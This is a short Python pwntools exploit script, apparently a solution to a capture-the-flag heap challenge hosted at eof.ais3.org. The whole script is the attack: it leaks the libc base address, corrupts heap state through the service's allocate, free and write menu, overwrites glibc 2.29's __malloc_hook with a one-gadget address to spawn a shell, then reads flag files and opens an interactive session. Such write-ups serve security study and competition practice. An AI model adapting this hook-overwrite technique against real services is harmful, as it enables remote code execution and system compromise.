#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

l = ELF( './libc-2.29.so' )

y = remote( 'eof.ais3.org' , 10105 )

def add( size ):
    y.sendlineafter( 'ice: ' , '1' )
    y.sendlineafter( ':' , str( size ) )

def free( offset ):
    y.sendlineafter( 'ice: ' , '2' )
    y.sendlineafter( ':' , offset )

def wri( data ):
    y.sendlineafter( 'ice: ' , '3' )
    y.sendafter( ':' , data )

y.recvuntil( '0x' )
l.address = int( y.recvline().strip() , 16 ) - l.sym.printf
success( 'libc -> %s' % hex( l.address ) )


add( 0x20d30 )
free( str( 0x20d40 ) )

add( 0x18 )
wri( p64( l.sym.__malloc_hook )[:-2] )

add( 0x68 )
add( 0x68 )

one = 0x106ef8

wri( p64( l.address + one )[:-2] )

add(0)

y.sendline( 'cat /home/*/flag' )


y.interactive()

